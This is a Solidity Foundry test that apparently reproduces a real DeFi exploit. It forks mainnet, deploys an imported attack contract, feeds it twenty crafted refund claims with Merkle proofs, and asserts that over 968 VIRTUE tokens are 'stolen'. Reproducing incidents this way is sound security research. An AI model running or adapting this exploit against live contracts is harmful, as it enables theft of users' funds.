// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../poc.sol";

contract IdolVirtueRefundAttackTest is Test {
    IERC20 constant VIRTUE =
        IERC20(0x9416bA76e88D873050A06e5956A3EBF10386b863);
    address constant ATTACKER = 0x622B4c078f1175c9aee10E9e79572F19cfEdfeAf;

    IdolVRA attackContract;

    function setUp() public {
        vm.createSelectFork(
            "https://eth.meowrpc.com",
            24433515
        );
        vm.prank(ATTACKER);
        attackContract = new IdolVRA();
    }

    function _buildClaims()
        internal
        pure
        returns (IdolVRA.Claim[] memory c)
    {
        c = new IdolVRA.Claim[](20);

        // [0] 425.6039 VIRTUE
        c[0].vcmi = 0xd8856cCe3F878d3Ea03964F80B18987fF1919272;
        c[0].amount = 425603926445278314908;
        c[0].proof[0] = 0x3e87048e9e498059ae9c82d00aa1e6c084c09fd0f7dc25ab801caf6b862b8bd5;
        c[0].proof[1] = 0x63c6c337e9cd007779270a42bdc64d673a7a943e2981aeb8697b7a23463f5179;
        c[0].proof[2] = 0xc10f52ce10f197e850f9dbcf3bb21fd4dd9767247d252416e2813e7264ba9f9e;
        c[0].proof[3] = 0x2483c557d42553ecb78e04f596df4b90962482b57c4e5467f29db96fc3d53baf;
        c[0].proof[4] = 0x9a8d3c25b05b5657fab35b80b94eac466f38fcc0aa3523d5be4addc6ff6fe731;
        c[0].proof[5] = 0x619a02c1f8867649d0c9e17a816d925a84f33483929434a06f1a0bb3c44ab4b8;
        c[0].proof[6] = 0x6e4e854ae63a28ac44d49941a361385245ef1200ad9916256c48afffcfa95ab7;
        c[0].proof[7] = 0x7f7f2badc17e6da01df18eca806869673b52143bff0c8bceaa11559cf3709070;

        // [1] 114.1243 VIRTUE
        c[1].vcmi = 0x4f522cbCC4E1Fa79440D0292a5cD7507d1F8987F;
        c[1].amount = 114124275237999999772;
        c[1].proof[0] = 0xad4d645de5306b1834694cfe0dd27a9f60e8c76f4f23e5f0036c4939d0d1eadf;
        c[1].proof[1] = 0x5a7d4264a498bfde4cc7898340cec9b52d1617e2431ffa394653fcdb7743d19a;
        c[1].proof[2] = 0x0ea49a91b7e475579f0fb5c5a7170fe7c50fad96cc4d39a8ecf8f887ab41281c;
        c[1].proof[3] = 0x244b27f639a8ac81f81b212eeec67a844581dae744d7fae14e2cf28f8435b846;
        c[1].proof[4] = 0x511bdb9f60204496e2551ba4af479c5dcf874615ff18fee23b455d2ffa1cc7b5;
        c[1].proof[5] = 0x8d3cdd952a86c3f198d05c67925d71d528c671bdec6ffa69fa8224286c8944ac;
        c[1].proof[6] = 0xc1e42f04b8182876275ed2c05715c2c1aa3b5a1211ee92e88a265d6924ecf249;
        c[1].proof[7] = 0xb98e1a58b11a29b08726325dad239feaacfa61c5b4a24341067e34c08d0df397;

        // [2] 114.1243 VIRTUE
        c[2].vcmi = 0x0F9722e3C05d072b74eecA56CB1AA333100B1184;
        c[2].amount = 114124275237999999772;
        c[2].proof[0] = 0xc7c21e1078bd721913b072f475883b02219c0b0f1d9fa8fa705548cb4bb65c2d;
        c[2].proof[1] = 0x4db5daea8137a59a41381a73540c153695abeae20071a0fb61099ba877f8ca15;
        c[2].proof[2] = 0x7ebf84937aa52aa3da5738d5c228fabedf9361b6fe368c69db689c8668b74d2e;
        c[2].proof[3] = 0xb37cdfe31bde5e6309f78d4dbcd7567d7d96373eb5eb47a896d7e57b6ca8ab82;
        c[2].proof[4] = 0xc7270c8f439a635b92ebb31224a5ef5171fa2341093bee8a4e133ef469ce098e;
        c[2].proof[5] = 0xacecacc7045ed5100032495dbfc08a120a60092ab1a6426cfcf2419f2ab1695b;
        c[2].proof[6] = 0x6e4e854ae63a28ac44d49941a361385245ef1200ad9916256c48afffcfa95ab7;
        c[2].proof[7] = 0x7f7f2badc17e6da01df18eca806869673b52143bff0c8bceaa11559cf3709070;

        // [3] 102.7118 VIRTUE
        c[3].vcmi = 0xb87Ebf06f8C99F43ecad940e4F1ACe84EECE776b;
        c[3].amount = 102711847714200000001;
        c[3].proof[0] = 0xd5e14429f3cd33041ac3f4e2551059376a332714e7c2e9f09f51aacb8f5bf63d;
        c[3].proof[1] = 0x42bb230c93f95a523d62ec5ffe6398303d95f129332a9b258bea227c9b28d1b2;
        c[3].proof[2] = 0x5fba7480fa53eb527bab74fea5d0b2fb1e52038bb9a58601e8aeaf52356ca05d;
        c[3].proof[3] = 0xbc4509daef26c40e07c53858654c6f4c942fcddf6511b35ad6919690e8f3e9f2;
        c[3].proof[4] = 0xaa649a72f4ff66842c1587ced7989d27f87d277c3708426978342d20ac54cd09;
        c[3].proof[5] = 0x1f82b2fbe76aa90b0497cf63a5090366f0dc0ba655cb7e615e0f6bf988a31fca;
        c[3].proof[6] = 0xc1e42f04b8182876275ed2c05715c2c1aa3b5a1211ee92e88a265d6924ecf249;
        c[3].proof[7] = 0xb98e1a58b11a29b08726325dad239feaacfa61c5b4a24341067e34c08d0df397;

        // [4] 57.0621 VIRTUE
        c[4].vcmi = 0xe1B8884110B1eD28E380fFbe5BD16d315AE9712B;
        c[4].amount = 57062137618999999772;
        c[4].proof[0] = 0xff6c8561ddfac5189a4669410daea031d71b8aa98f1c470eba57428a8db83263;
        c[4].proof[1] = 0xbc03daa4964573b44fe12cd79de99bebf5ebfec1f43c12a60ede2276c10c8601;
        c[4].proof[2] = 0xf2280fc85e4b728dd510799c6c0f61d42740e55be1172f7b3d79faa81b2d1b0c;
        c[4].proof[3] = 0x707b9c4ca42119715469587571adab96b8eb1e6ae2eca1297c6132ae2c448c90;
        c[4].proof[4] = 0xff67036cab16be399d99889aee6275735cb98e3b7d84b6fa6771e89e75156eb4;
        c[4].proof[5] = 0xa9e17ddb5f3738297e273327147c5dff082066a8b28e1097a0cfd33fed32854f;
        c[4].proof[6] = 0x9b8853c15a0e6e7b9b568ea7ea98ab54009be2be6b53dde74da8fd0c034443c6;
        c[4].proof[7] = 0xb98e1a58b11a29b08726325dad239feaacfa61c5b4a24341067e34c08d0df397;

        // [5] 56.5831 VIRTUE
        c[5].vcmi = 0x58a9ABbc6355490a50EED6a159D8f5F2159e7E30;
        c[5].amount = 56583137603746674750;
        c[5].proof[0] = 0xf2cb5119c12a2628ab0d6bafeb2b6dae414130820c374e066213423dea69d332;
        c[5].proof[1] = 0x5c089e3238fb6078f350f484a8ccdea050d1df0fd2b3aed5cbb8e0dafce45277;
        c[5].proof[2] = 0x46ab1e6094b22f55eb44280c3dc2e12714d5584815492448d5f5bcc93a86e386;
        c[5].proof[3] = 0x35f6f94d2f5ab29fce4d6d63b1c6029d616278587187f13e7402c091622c3fb5;
        c[5].proof[4] = 0xc7270c8f439a635b92ebb31224a5ef5171fa2341093bee8a4e133ef469ce098e;
        c[5].proof[5] = 0xacecacc7045ed5100032495dbfc08a120a60092ab1a6426cfcf2419f2ab1695b;
        c[5].proof[6] = 0x6e4e854ae63a28ac44d49941a361385245ef1200ad9916256c48afffcfa95ab7;
        c[5].proof[7] = 0x7f7f2badc17e6da01df18eca806869673b52143bff0c8bceaa11559cf3709070;

        // [6] 45.6497 VIRTUE
        c[6].vcmi = 0x63F0a3660170A5c9cd4CA7b28B82f0011FFB37C4;
        c[6].amount = 45649710095199999771;
        c[6].proof[0] = 0xd3bcfd9d87a3bd7dc9c209f80849d4371f5e66b5a352285f52d2de64c9c46929;
        c[6].proof[1] = 0x6ec7f95f41cca14d2e8e46aefbdbd16c5b71c9d8166853dc5a7cb7d6b7e3e2c8;
        c[6].proof[2] = 0x672086853c3a426dc38c4eba48071c2a5b8cbaa3236eebdd583791a0522945ae;
        c[6].proof[3] = 0x4f5e2f0ed592dc0fb4906ee0ac2afb8c162e4d6e4a82fb5b2aa590f7d5b88247;
        c[6].proof[4] = 0x226a6b6c9f9e7ed3c65e003e8a9cf6ee74883516ec1e75c47da96cb16acfb2b2;
        c[6].proof[5] = 0x8d3cdd952a86c3f198d05c67925d71d528c671bdec6ffa69fa8224286c8944ac;
        c[6].proof[6] = 0xc1e42f04b8182876275ed2c05715c2c1aa3b5a1211ee92e88a265d6924ecf249;
        c[6].proof[7] = 0xb98e1a58b11a29b08726325dad239feaacfa61c5b4a24341067e34c08d0df397;

        // [7] 22.8249 VIRTUE
        c[7].vcmi = 0x9Fd6843163f3F501AcfC98188e49Ffb62A99645B;
        c[7].amount = 22824855047599999772;
        c[7].proof[0] = 0x41305bd9c530618f8834a5d5b364390c349d0436ba4f7fa34ad3559749f6a1c0;
        c[7].proof[1] = 0x002abde4063e1b93148f7c07c6e0b707f122ed60d577cbc071de2328d674cde8;
        c[7].proof[2] = 0x7daf073c50b5e1665d2e785f71304dc4b553f7281d43db50d52f297d59fdce8d;
        c[7].proof[3] = 0xd1130dc7a72c61a06e3d3ca4059ec6ed4a2753ea10014402500cd519a36e5a2e;
        c[7].proof[4] = 0x67ff0ece1701e108f9ce7204d5bbae1a54085307af398f33ad417a6a0f119a38;
        c[7].proof[5] = 0x8f97341fa5564ddcd8697eceeed7f93d5e962e6e89c6d20bb8bec653031e6a6f;
        c[7].proof[6] = 0xb30f113f647a9dd0474566fbff5cd872f660876df15857e6d65ba981d4a52508;
        c[7].proof[7] = 0x7f7f2badc17e6da01df18eca806869673b52143bff0c8bceaa11559cf3709070;

        // [8] 11.4124 VIRTUE
        c[8].vcmi = 0xAB5f9071D325b9B5844D52cD4e55ea6bbaCeB021;
        c[8].amount = 11412427523799999771;
        c[8].proof[0] = 0x19c3d7cea69415bbaaab25c02c5870cc1b9f36932a6d040cf8998dbab759642a;
        c[8].proof[1] = 0x41f6ddc29d7c3ef32d9d2f0957a0f14977661faff0d35643e462a14f7c61d292;
        c[8].proof[2] = 0x1bf5c6fec96329cd4defb5524432dda87d40785364944fcc5434462e37382b86;
        c[8].proof[3] = 0x9ba6057a702097ec0aa54ed1775cd0fdca6fb031175f02bc0efb947194515372;
        c[8].proof[4] = 0x9a8d3c25b05b5657fab35b80b94eac466f38fcc0aa3523d5be4addc6ff6fe731;
        c[8].proof[5] = 0x619a02c1f8867649d0c9e17a816d925a84f33483929434a06f1a0bb3c44ab4b8;
        c[8].proof[6] = 0x6e4e854ae63a28ac44d49941a361385245ef1200ad9916256c48afffcfa95ab7;
        c[8].proof[7] = 0x7f7f2badc17e6da01df18eca806869673b52143bff0c8bceaa11559cf3709070;

        // [9] 9.8147 VIRTUE
        c[9].vcmi = 0x3103f527ec280F37483c364A696D8cF4978a702B;
        c[9].amount = 9814687670467999772;
        c[9].proof[0] = 0xcb823cf7ced3d49480d825e79f1cec2de59360b810eece8088034dfb77bfd6d1;
        c[9].proof[1] = 0xaf3a17ef03fe06a785d5da4e5d75b5d7b2d6bf7c03a40ab1ac6916756a294b07;
        c[9].proof[2] = 0x383db3cb6e4e36fad145277aee1c609798f13565e6f3f3ff34c1126480699768;
        c[9].proof[3] = 0xe2b9fb87914d7d64fb484dfa98228dee4627be889f9e257f3684f1cacbf9d391;
        c[9].proof[4] = 0xdfe37f92ffd70f4f495479d926b3dc268e663b2798b1a335602194ec91cb1c7e;
        c[9].proof[5] = 0xde697f08b6e3c8570bba804206ae0ca7288125d58a50c6e1c938da778d69e618;
        c[9].proof[6] = 0x9b8853c15a0e6e7b9b568ea7ea98ab54009be2be6b53dde74da8fd0c034443c6;
        c[9].proof[7] = 0xb98e1a58b11a29b08726325dad239feaacfa61c5b4a24341067e34c08d0df397;

        // [10] 2.4437 VIRTUE
        c[10].vcmi = 0x736DdE3E0F5c588dDC53ad7f0F65667C0Cca2801;
        c[10].amount = 2443693693693693692;
        c[10].proof[0] = 0x3089dee2c5b005da3e5b4a447770996178edde823c8073c740c82abd6feadaa4;
        c[10].proof[1] = 0x2ead7342233bd3c9d4425bdc9a7cae897596eeccfe1468cde15f407e7bb4dc28;
        c[10].proof[2] = 0x9426a74504772d317b43ea2d16f68c524df24bf239bc049f3f636f0d8603abb6;
        c[10].proof[3] = 0xace456632471b8a91582fce437edbe1ada72611a1f17efb63e8699e05afc430e;
        c[10].proof[4] = 0xfd0b254b45b0d342a97060d39e7566de5154934ca702582cd47a21574a76c186;
        c[10].proof[5] = 0xa956f3c82fa44d762a67a34d4165cde879a0af04d0cfc6b8f965f7c01fe4d72f;
        c[10].proof[6] = 0xb30f113f647a9dd0474566fbff5cd872f660876df15857e6d65ba981d4a52508;
        c[10].proof[7] = 0x7f7f2badc17e6da01df18eca806869673b52143bff0c8bceaa11559cf3709070;

        // [11] 0.9846 VIRTUE
        c[11].vcmi = 0xd3DAC9545613021b6a3530a0df21df7f1cf157f2;
        c[11].amount = 984636541022388074;
        c[11].proof[0] = 0x2cdb9b2f616167af776e3a7878a61fffc62396da7a2e3cc125da3147e2516c90;
        c[11].proof[1] = 0x47f6e33a92dec40d4a81c5aa5cc0574e8763b319a9461a121038d2e0e4332bfe;
        c[11].proof[2] = 0xf147b855fa89fcfaf3297229eb5d36484d7a0c64af9223c19072a466270744ab;
        c[11].proof[3] = 0x34ff77450018d8faeec59c9fdad728091d4c99bfccbad8d545ca51372979dc52;
        c[11].proof[4] = 0xacd34c522be31063b3ccf0e0edfa01ffb135f3f1fb4d2886b2921605a3d30172;
        c[11].proof[5] = 0x1f82b2fbe76aa90b0497cf63a5090366f0dc0ba655cb7e615e0f6bf988a31fca;
        c[11].proof[6] = 0xc1e42f04b8182876275ed2c05715c2c1aa3b5a1211ee92e88a265d6924ecf249;
        c[11].proof[7] = 0xb98e1a58b11a29b08726325dad239feaacfa61c5b4a24341067e34c08d0df397;

        // [12] 0.9525 VIRTUE
        c[12].vcmi = 0x005A3E49aF2Cf567D655c6cCb3e5982E1D55E72b;
        c[12].amount = 952480258035813590;
        c[12].proof[0] = 0x9195016369d402d6dde755813d6174903b0f9e3e7077a62879c03ee3ce59a21f;
        c[12].proof[1] = 0x027b481b1de99d3c6691f050205db54b478dce20ea81fbbee54cfa9070c9180e;
        c[12].proof[2] = 0x5d54d2193e9baff1c1b9b0709aa475a6283e4f4bb3271af7fa0e70311d8d89e8;
        c[12].proof[3] = 0x47c3d78f1010601769b4bd46e42907c2b11348964f2e99ffd01d9f7d0bbf5336;
        c[12].proof[4] = 0xec9612171fce8d19d0ff5a453f26bf7f874e15501a2003198308d9b279457370;
        c[12].proof[5] = 0xde697f08b6e3c8570bba804206ae0ca7288125d58a50c6e1c938da778d69e618;
        c[12].proof[6] = 0x9b8853c15a0e6e7b9b568ea7ea98ab54009be2be6b53dde74da8fd0c034443c6;
        c[12].proof[7] = 0xb98e1a58b11a29b08726325dad239feaacfa61c5b4a24341067e34c08d0df397;

        // [13] 0.9525 VIRTUE
        c[13].vcmi = 0x88f6A56bB64A019F722E9d694e9F8C1876ccE687;
        c[13].amount = 952480258035813590;
        c[13].proof[0] = 0xb4ef12d22f09ce199147d5e2874a6eddde9fe919281f5b4c979b4e44cdeae151;
        c[13].proof[1] = 0xc9f02fe7a3168b70b8b10ab5d3dbd93ab29a20664fb79a2c685218b801a397ff;
        c[13].proof[2] = 0x7da277b6d3ae9d19591952485acd2ebc0306e37bd5806caa2baf374b58431076;
        c[13].proof[3] = 0xdacb4756f1249315d094aa867f818ec5dfe531c29876e0e4952edeab2a9846ce;
        c[13].proof[4] = 0x8b8a81243e59a81e944e4e2b43bd44ba7fc544e5db778319203d92e49e9ef27d;
        c[13].proof[5] = 0x8f97341fa5564ddcd8697eceeed7f93d5e962e6e89c6d20bb8bec653031e6a6f;
        c[13].proof[6] = 0xb30f113f647a9dd0474566fbff5cd872f660876df15857e6d65ba981d4a52508;
        c[13].proof[7] = 0x7f7f2badc17e6da01df18eca806869673b52143bff0c8bceaa11559cf3709070;

        // [14] 0.9466 VIRTUE
        c[14].vcmi = 0x442BCb92f27fecc5d93d8d7307195F6617192321;
        c[14].amount = 946561641006085450;
        c[14].proof[0] = 0xd2f75f8ea64f4010e19bbb83818aa0da490edbbc0dd442942a92b4b2f99ddfbd;
        c[14].proof[1] = 0x4a95a16081dac8a099bdaf390b944d9a4d8b8b1147ae1ab7bfc569b6bb83b846;
        c[14].proof[2] = 0x5be1e9367b9c88c8b36e765fa77cae078e3d8402418bd88e9069343e9bff03a3;
        c[14].proof[3] = 0xb37cdfe31bde5e6309f78d4dbcd7567d7d96373eb5eb47a896d7e57b6ca8ab82;
        c[14].proof[4] = 0xc7270c8f439a635b92ebb31224a5ef5171fa2341093bee8a4e133ef469ce098e;
        c[14].proof[5] = 0xacecacc7045ed5100032495dbfc08a120a60092ab1a6426cfcf2419f2ab1695b;
        c[14].proof[6] = 0x6e4e854ae63a28ac44d49941a361385245ef1200ad9916256c48afffcfa95ab7;
        c[14].proof[7] = 0x7f7f2badc17e6da01df18eca806869673b52143bff0c8bceaa11559cf3709070;

        // [15] 0.6152 VIRTUE
        c[15].vcmi = 0x06005605Bc9a8F9c1eCd921775d5073031889880;
        c[15].amount = 615238254127143016;
        c[15].proof[0] = 0xdfe3a20427d4ebad2aba8049ba35552426dfed58e170a9ef4d30ebefb5b94498;
        c[15].proof[1] = 0xc4adac820c4d19c8de5643d20f0716258fec301363888159a0795c4bcdf560f6;
        c[15].proof[2] = 0xd48412f9092892c07284c5a2955fd201a4bbc6191d504993efa0a5d4fff61e17;
        c[15].proof[3] = 0xace456632471b8a91582fce437edbe1ada72611a1f17efb63e8699e05afc430e;
        c[15].proof[4] = 0xfd0b254b45b0d342a97060d39e7566de5154934ca702582cd47a21574a76c186;
        c[15].proof[5] = 0xa956f3c82fa44d762a67a34d4165cde879a0af04d0cfc6b8f965f7c01fe4d72f;
        c[15].proof[6] = 0xb30f113f647a9dd0474566fbff5cd872f660876df15857e6d65ba981d4a52508;
        c[15].proof[7] = 0x7f7f2badc17e6da01df18eca806869673b52143bff0c8bceaa11559cf3709070;

        // [16] 0.6060 VIRTUE
        c[16].vcmi = 0x0D99E9a9cB81eF149ae2A1270a6C7a9593EdBa9b;
        c[16].amount = 606002828225050447;
        c[16].proof[0] = 0x2ebf7788a0395ab54889ac7848f6be7e3c80367785f9ac61573cb32a3deab8a2;
        c[16].proof[1] = 0xab8b1b326d1301feb35ce97ca5492daf2e7d087435d4797b1a49cd9394eed738;
        c[16].proof[2] = 0x8f53902d4e90f28c018d5a97a81afa3ccd9484ebd4477d7beab968f176dd7b28;
        c[16].proof[3] = 0x244b27f639a8ac81f81b212eeec67a844581dae744d7fae14e2cf28f8435b846;
        c[16].proof[4] = 0x511bdb9f60204496e2551ba4af479c5dcf874615ff18fee23b455d2ffa1cc7b5;
        c[16].proof[5] = 0x8d3cdd952a86c3f198d05c67925d71d528c671bdec6ffa69fa8224286c8944ac;
        c[16].proof[6] = 0xc1e42f04b8182876275ed2c05715c2c1aa3b5a1211ee92e88a265d6924ecf249;
        c[16].proof[7] = 0xb98e1a58b11a29b08726325dad239feaacfa61c5b4a24341067e34c08d0df397;

        // [17] 0.5999 VIRTUE
        c[17].vcmi = 0x48e9E2F211371bD2462e44Af3d2d1aA610437f82;
        c[17].amount = 599865738754627642;
        c[17].proof[0] = 0x40a319ab837843ecf8dae0c75ec6f9caa6c1ea4a7ac0b538a62f682c15ff9493;
        c[17].proof[1] = 0xa16e7b6829f69c2b94f876fbc34f506260e5a0ee29a8b2b5796d1c92c6e89650;
        c[17].proof[2] = 0x67e483207ce37cfa862faac14a4361f6efbe9575f2914549f435e96d23dd3c18;
        c[17].proof[3] = 0xd1130dc7a72c61a06e3d3ca4059ec6ed4a2753ea10014402500cd519a36e5a2e;
        c[17].proof[4] = 0x67ff0ece1701e108f9ce7204d5bbae1a54085307af398f33ad417a6a0f119a38;
        c[17].proof[5] = 0x8f97341fa5564ddcd8697eceeed7f93d5e962e6e89c6d20bb8bec653031e6a6f;
        c[17].proof[6] = 0xb30f113f647a9dd0474566fbff5cd872f660876df15857e6d65ba981d4a52508;
        c[17].proof[7] = 0x7f7f2badc17e6da01df18eca806869673b52143bff0c8bceaa11559cf3709070;

        // [18] 0.3279 VIRTUE
        c[18].vcmi = 0x17E32FdB2c47B2e46245e3ad25228cd3FAff230f;
        c[18].amount = 327867550089772311;
        c[18].proof[0] = 0xb2ffea211845cd7bdaaf82f60e4127d092d522eb75b331de32a8e43bc523ac29;
        c[18].proof[1] = 0xb043a6697b10bcf98157493252a907486a2f513349949a1a9e4001a560bb6345;
        c[18].proof[2] = 0x33635004af6c2b79c4267b5f59848064125e570f454ecb2313bfa1c6156a0b48;
        c[18].proof[3] = 0xdacb4756f1249315d094aa867f818ec5dfe531c29876e0e4952edeab2a9846ce;
        c[18].proof[4] = 0x8b8a81243e59a81e944e4e2b43bd44ba7fc544e5db778319203d92e49e9ef27d;
        c[18].proof[5] = 0x8f97341fa5564ddcd8697eceeed7f93d5e962e6e89c6d20bb8bec653031e6a6f;
        c[18].proof[6] = 0xb30f113f647a9dd0474566fbff5cd872f660876df15857e6d65ba981d4a52508;
        c[18].proof[7] = 0x7f7f2badc17e6da01df18eca806869673b52143bff0c8bceaa11559cf3709070;

        // [19] 0.1771 VIRTUE
        c[19].vcmi = 0x8042b39539876bA7E04E3fC97EF37fd13613024A;
        c[19].amount = 177061982617538173;
        c[19].proof[0] = 0x413f402a70f6c39ef885418db6868e0f0f588402771be61a47ec87d9e4e34817;
        c[19].proof[1] = 0x2091b1c22b212a6dc836131b26cdaf254a4865451614dba3124ca86dd16d8d68;
        c[19].proof[2] = 0x9306caae76597514acad4c7d5783b62557b6b991edc3528979a4716526d9f2c1;
        c[19].proof[3] = 0x5ad547d598f0593aac08b682a2f3064907f65977e7fa06e2b1c0b342bc4f0be8;
        c[19].proof[4] = 0x1e548394699dfec9615886d14c294c1617ae718863dc980dc75d8cfde3c44147;
        c[19].proof[5] = 0xacecacc7045ed5100032495dbfc08a120a60092ab1a6426cfcf2419f2ab1695b;
        c[19].proof[6] = 0x6e4e854ae63a28ac44d49941a361385245ef1200ad9916256c48afffcfa95ab7;
        c[19].proof[7] = 0x7f7f2badc17e6da01df18eca806869673b52143bff0c8bceaa11559cf3709070;
    }

    function test_contractAttack() public {
        IdolVRA.Claim[] memory claims = _buildClaims();

        uint256 balBefore = VIRTUE.balanceOf(ATTACKER);

        vm.prank(ATTACKER);
        attackContract.exec(claims);

        uint256 stolen = VIRTUE.balanceOf(ATTACKER) - balBefore;
        emit log_named_decimal_uint("VIRTUE stolen", stolen, 18);
        assertGt(stolen, 968e18);
    }
}
